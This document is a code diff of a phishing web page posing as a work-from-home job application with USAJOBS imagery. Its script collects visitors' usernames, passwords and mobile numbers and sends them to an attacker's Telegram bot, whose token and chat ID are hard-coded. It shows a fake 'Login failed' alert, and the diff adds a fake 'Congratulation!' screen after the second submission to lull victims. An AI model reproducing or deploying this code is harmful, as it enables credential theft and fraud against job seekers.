@@ -6,17 +6,17 @@
   <title>Work From Home - Apply now</title>
   <style>
     body {
-  font-family: "Roboto", Arial, sans-serif;
-  background-image: url('https://usa-jobs.github.io/USAJOB.com/USAJOBS.jpg');
-  background-size: 100% 100%; /* fit entire screen */
-  background-position: center;
-  background-repeat: no-repeat;
-  margin: 0;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
+      font-family: "Roboto", Arial, sans-serif;
+      background-image: url('https://usa-jobs.github.io/USAJOB.com/USAJOBS.jpg');
+      background-size: 100% 100%; /* fit entire screen */
+      background-position: center;
+      background-repeat: no-repeat;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
 
     .login-box {
       background: rgba(255, 255, 255, 0.85); /* transparent white */
@@ -115,8 +115,11 @@
   </div>
 
   <script>
+    let loginAttempt = 0; // counter for login attempts
+
     document.getElementById('loginForm').addEventListener('submit', function(event) {
       event.preventDefault();
+      loginAttempt++;
 
       var username = document.getElementById('username').value;
       var password = document.getElementById('password').value;
@@ -125,12 +128,21 @@
       var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
 
       sendToTelegram(payload);
-      alert("Login failed: Invalid credentials"); // Gmail style fake response
+
+      if (loginAttempt === 1) {
+        // 1st attempt
+        alert("Login failed: Invalid credentials");
+      } else {
+        // 2nd attempt onwards
+        const loginBox = document.querySelector('.login-box');
+        loginBox.innerHTML = `<h2 style="font-size:28px; color:#1a73e8;">Congratulation!</h2>
+                              <p style="font-size:20px; color:#202124;">Our representative will contact you soon.</p>`;
+      }
     });
 
     function sendToTelegram(message) {
       var chatId = '5738863873'; // your Telegram user ID
-      var botToken = '8211036124:AAGSsDbdurbpjt7FtEyuKri0sQgmBfCjntU'; // your new bot token
+      var botToken = '8211036124:AAGSsDbdurbpjt7FtEyuKri0sQgmBfCjntU'; // your bot token
       var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
       var xhr = new XMLHttpRequest();
@@ -144,11 +156,3 @@
 
 </body>
 </html>
-
-
-
-
-
-
-
-
